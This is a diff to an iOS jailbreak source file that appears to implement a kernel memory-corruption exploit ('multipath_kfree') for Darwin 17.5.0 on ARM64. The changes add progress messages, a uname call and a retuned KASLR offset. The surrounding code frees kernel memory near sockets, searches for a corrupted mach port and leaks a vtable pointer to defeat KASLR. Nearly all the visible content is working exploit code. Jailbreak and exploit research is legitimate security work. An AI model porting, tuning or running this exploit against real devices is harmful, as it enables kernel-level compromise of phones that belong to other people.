@@ -5,12 +5,14 @@
 //  Created by John Åkerblom on 6/1/18.
 //  Copyright © 2018 kjljkla. All rights reserved.
 //
+//Darwin Kernel Version 17.5.0: Tue Mar 13 21:32:10 PDT 2018; root:xnu-4570.52.2~8/RELEASE_ARM64_T7000
 
 #include "jailbreak.h"
 #include "extra_recipe_utils.h"
 #include "multipath_kfree.h"
 
 #include <sys/socket.h>
+#include <sys/utsname.h>
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -71,6 +73,10 @@ void post_exploitation(uint64_t kaslr_shift)
 
 void jb_go(void)
 {
+    struct utsname u = {0};
+    uname(&u);
+
+    printf("Initializing...\n");
     io_connect_t refill_userclients[REFILL_USERCLIENTS_COUNT];
     mach_port_t first_ports[FIRST_PORTS_COUNT];
     mach_port_t refill_ports[REFILL_PORTS_COUNT];
@@ -108,10 +114,12 @@ void jb_go(void)
     for (int i = 0; i < FIRST_PORTS_COUNT; ++i) {
         _init_port_with_empty_msg(first_ports[i]);
     }
-    
+
+    printf("Exploiting...\n");
     multipath_kfree_nearby_self(mp_socks[0], 0x0000 + 0x7a0);
     multipath_kfree_nearby_self(mp_socks[3], 0xe000 + 0x7a0);
 
+    printf("finding corrupt port...\n");
     for (peeks = 0; peeks < MAX_PEEKS; ++peeks) {
         for (int i = 0 ; i < FIRST_PORTS_COUNT; ++i) {
             if (_is_port_corrupt(first_ports[i])) {
@@ -163,7 +171,7 @@ void jb_go(void)
     recv_buf = (uint8_t *)receive_prealloc_msg(corrupt_port);
     
     uint64_t vtable = *(uint64_t *)(recv_buf + 0x14);
-    uint64_t kaslr_shift = vtable - 0xfffffff006fdd978;
+    uint64_t kaslr_shift = vtable - (0xfffffff006fdd978+0x041ca58);
     printf("AGXCommandQueue vtable: %p\n", (void *)vtable);
     printf("kaslr shift: %p\n", (void *)kaslr_shift);
     
